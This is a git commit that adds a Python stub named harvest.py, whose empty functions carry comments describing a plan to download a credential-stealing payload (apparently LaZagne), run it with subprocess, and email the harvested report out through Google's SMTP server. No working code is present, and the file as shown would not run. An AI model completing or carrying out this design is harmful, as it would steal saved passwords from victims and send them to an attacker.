17d7132832ff9fe4503650ef6e299bc72390a9e0
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-02 02:48:53 -0400

    Basic working Principal

---
+++ harvest.py
@@ -0,0 +1,13 @@
+#!/usr/bin/env python
+import subprocess
+import smtplib
+import requests
+
+def get_payload():
+    #download the lazange paylaod from online
+
+def execute_it():
+    #execute the downloaded payload using subprocess module
+
+def mail_it():
+    #mail the report to us using google smtp server
